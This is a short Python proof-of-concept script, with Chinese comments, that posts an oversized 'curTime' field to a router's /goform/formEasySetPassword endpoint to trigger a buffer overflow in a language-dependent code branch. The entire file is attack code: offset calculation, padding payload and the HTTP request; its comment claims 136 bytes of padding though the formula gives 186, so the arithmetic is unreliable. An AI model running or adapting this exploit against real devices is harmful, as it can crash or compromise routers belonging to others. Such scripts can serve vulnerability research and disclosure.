import requests
import struct

# 目标配置
TARGET_IP = "192.168.0.1"
URL = f"http://{TARGET_IP}/goform/formEasySetPassword"

# 计算偏移量
OFFSET_TO_RETURN_ADDR = 172  # 从 v11 到返回地址
FORMAT_STR_LEN = 36          # 格式化字符串长度
PADDING_LEN = OFFSET_TO_RETURN_ADDR - FORMAT_STR_LEN + 50 # 136 字节

# 构造 Payload
padding = b'A' * PADDING_LEN

payload = padding 

# 构造 HTTP 请求
# 注意：language 不能是 "SC" 或 "TW"，否则不会触发漏洞分支
data = {
    "curTime": payload,  
    "language": "EN",  # 确保触发漏洞分支
    "config.password": "test123",
    "config.user_password": "test123"
}

# 发送请求
response = requests.post(URL, data=data)
print(f"Response Status: {response.status_code}")